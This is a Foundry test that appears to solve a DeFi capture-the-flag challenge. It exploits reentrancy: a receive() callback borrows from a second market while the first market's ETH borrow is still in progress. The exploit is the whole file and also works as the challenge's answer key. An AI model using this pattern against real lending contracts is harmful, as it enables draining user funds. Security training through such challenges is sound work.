// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Challenge} from "../src/Challenge.sol";
import "../src/interface.sol";

contract SolveTest is Test {
    Challenge chal;
    IMarketETH public marketETH;
    IMarketToken public marketToken;
    IERC20 public token;

    function setUp() public {
        chal = new Challenge();
        marketETH = IMarketETH(address(chal.marketETH()));
        marketToken = IMarketToken(address(chal.marketToken()));
    }

    function test_solve() public payable {
        vm.deal(address(this), 1 ether);
        marketETH.deposit{value: 1 ether}();
        marketETH.borrow(1 ether);
        assertTrue(chal.isSolved());
    }

    receive() external payable {
        if(msg.value > 0) {
            marketToken.borrow(msg.value);
        }
    }
}